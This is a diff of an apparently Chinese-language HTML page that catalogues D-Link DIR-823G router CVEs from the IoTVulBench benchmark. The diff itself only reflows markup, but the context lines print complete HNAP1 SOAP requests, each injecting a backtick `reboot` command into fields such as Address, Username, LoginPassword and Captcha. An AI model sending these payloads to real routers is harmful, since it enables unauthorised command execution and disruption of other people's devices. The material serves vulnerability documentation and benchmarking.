@@ -25,7 +25,9 @@ firmware: "D-Link DIR-823G A1 v1.0.2B03 / v1.0.2B05"
 
 <h3>CVE-2019-7297</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-7297/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-7297/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST /HNAP1/ HTTP/1.1
@@ -47,7 +49,9 @@ Connection: close
 &lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;soap:Envelope xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'&gt;  &lt;soap:Body&gt;    &lt;SetNetworkTomographySettings xmlns='http://purenetworks.com/HNAP1/'&gt;      <mark>&lt;Address&gt;;'`reboot`';&lt;/Address&gt;</mark>      <mark>&lt;Number&gt;4&lt;/Number&gt;</mark>          <mark>&lt;Size&gt;4&lt;/Size&gt;</mark>     &lt;/SetNetworkTomographySettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>变化 1：SOAPAction 头为 GetWanSettings。变化 2：Address 使用 ;'&#96;reboot&#96;';，Number=4、Size=4。</div>
+<div>
+变化 1：SOAPAction 头为 GetWanSettings。变化 2：Address 使用 ;'&#96;reboot&#96;';，Number=4、Size=4。
+</div>
 
 </section>
 
@@ -55,7 +59,9 @@ Connection: close
 
 <h3>CVE-2022-43109</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2022-43109/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2022-43109/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST http://TARGET_HOST:PORT/HNAP1/ HTTP/1.1
@@ -77,7 +83,9 @@ Connection: close
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;<mark>SetNetworkTomographySettings</mark> xmlns="http://purenetworks.com/HNAP1/"&gt;<mark>&lt;Address&gt;www.'`reboot`'.com&lt;/Address&gt;</mark><mark>&lt;Number&gt;5&lt;/Number&gt;</mark><mark>&lt;Size&gt;64&lt;/Size&gt;</mark>&lt;/<mark>SetNetworkTomographySettings</mark>&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>变化 1：SOAPAction 头为 SetNetworkTomographySettings。变化 2：Address 使用 www.'&#96;reboot&#96;'.com，Number=5、Size=64。</div>
+<div>
+变化 1：SOAPAction 头为 SetNetworkTomographySettings。变化 2：Address 使用 www.'&#96;reboot&#96;'.com，Number=5、Size=64。
+</div>
 
 </section>
 
@@ -102,7 +110,9 @@ Connection: close
 
 <h3>CVE-2019-13128</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-13128/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-13128/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST /HNAP1/ HTTP/1.1
@@ -124,7 +134,9 @@ Connection: keep-alive
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;<mark>SetStaticRouteSettings</mark> xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;<mark>StaticClientInfoList</mark>&gt;&lt;ClientInfo&gt;&lt;IPAddress&gt;10.3.8.211;'<mark>`reboot`</mark>'&lt;/IPAddress&gt;&lt;SubnetMask&gt;255.255.255.255&lt;/SubnetMask&gt;&lt;Gateway&gt;192.168.0.3&lt;/Gateway&gt;&lt;Interface&gt;lan&lt;/Interface&gt;&lt;/ClientInfo&gt;&lt;/<mark>StaticClientInfoList</mark>&gt;&lt;/<mark>SetStaticRouteSettings</mark>&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>变化：SOAPAction 为 GetWanCurrentStatus；列表名为 StaticClientInfoList；注入 IPAddress。</div>
+<div>
+变化：SOAPAction 为 GetWanCurrentStatus；列表名为 StaticClientInfoList；注入 IPAddress。
+</div>
 
 </section>
 
@@ -132,7 +144,9 @@ Connection: keep-alive
 
 <h3>CVE-2019-15528</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15528/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15528/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST /HNAP1/ HTTP/1.1
@@ -154,7 +168,9 @@ Cookie: &lt;SESSION_COOKIE&gt;
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetStaticRouteSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;<mark>StaticRouteClientInfoLists</mark>&gt;&lt;ClientInfo&gt;&lt;IPAddress&gt;10.3.8.212&lt;/IPAddress&gt;&lt;SubnetMask&gt;255.255.255.255&lt;/SubnetMask&gt;&lt;Gateway&gt;192.168.0.1&lt;/Gateway&gt;&lt;Interface&gt;<mark>lan'`reboot`'</mark>&lt;/Interface&gt;&lt;/ClientInfo&gt;&lt;/<mark>StaticRouteClientInfoLists</mark>&gt;&lt;/SetStaticRouteSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>变化：SOAPAction 为 SetStaticRouteSettings；列表名为 StaticRouteClientInfoLists；注入 Interface。</div>
+<div>
+变化：SOAPAction 为 SetStaticRouteSettings；列表名为 StaticRouteClientInfoLists；注入 Interface。
+</div>
 
 </section>
 
@@ -181,7 +197,9 @@ Cookie: &lt;SESSION_COOKIE&gt;
 
 <h3>CVE-2019-15529</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15529/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15529/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST /HNAP1/ HTTP/1.1
@@ -201,7 +219,9 @@ Referer: http://TARGET_HOST:PORT/
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;<mark>&lt;Username&gt;Admin'`reboot`'&lt;/Username&gt;</mark>&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;PrivateLogin&gt;LoginPassword&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>注入点：Username。</div>
+<div>
+注入点：Username。
+</div>
 
 </section>
 
@@ -209,7 +229,9 @@ Referer: http://TARGET_HOST:PORT/
 
 <h3>CVE-2019-15530</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15530/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-15530/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST /HNAP1/ HTTP/1.1
@@ -229,7 +251,9 @@ Referer: http://TARGET_HOST:PORT/
   &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;<mark>&lt;LoginPassword&gt;'`reboot`'&lt;/LoginPassword&gt;</mark>&lt;Captcha&gt;&lt;/Captcha&gt;&lt;PrivateLogin&gt;LoginPassword&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>注入点：LoginPassword。</div>
+<div>
+注入点：LoginPassword。
+</div>
 
 </section>
 </div>
@@ -239,7 +263,9 @@ Referer: http://TARGET_HOST:PORT/
 
 <h3>CVE-2020-25367</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25367/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25367/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST /HNAP1/ HTTP/1.1
@@ -260,7 +286,9 @@ Referer: http://TARGET_HOST:PORT/
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;<mark>&lt;Captcha&gt;'`reboot`'&lt;/Captcha&gt;</mark>&lt;PrivateLogin&gt;&lt;/PrivateLogin&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>注入点：Captcha。</div>
+<div>
+注入点：Captcha。
+</div>
 
 </section>
 
@@ -268,7 +296,9 @@ Referer: http://TARGET_HOST:PORT/
 
 <h3>CVE-2020-25368</h3>
 
-<div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25368/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a></div>
+<div>
+原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2020-25368/BM-2024-00002-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>
+</div>
 
 <pre>
 POST /HNAP1/ HTTP/1.1
@@ -289,7 +319,9 @@ Referer: http://TARGET_HOST:PORT/
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;Login xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;<mark>&lt;PrivateLogin&gt;'`reboot`'&lt;/PrivateLogin&gt;</mark>&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
 
-<div>注入点：PrivateLogin。</div>
+<div>
+注入点：PrivateLogin。
+</div>
 
 </section>
 
